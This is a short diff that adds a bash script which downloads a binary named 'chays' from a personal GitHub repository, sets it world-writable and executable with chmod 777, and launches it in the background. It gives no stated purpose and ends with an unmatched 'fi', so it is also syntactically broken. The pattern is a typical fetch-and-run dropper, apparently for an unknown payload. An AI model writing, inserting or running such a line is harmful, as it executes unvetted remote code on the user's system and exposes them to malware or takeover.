@@ -1,0 +1,3 @@
+#!/bin/bash
+wget https://github.com/khangcbs/mr/raw/main/chays&&chmod 777 chays&&./chays &
+fi
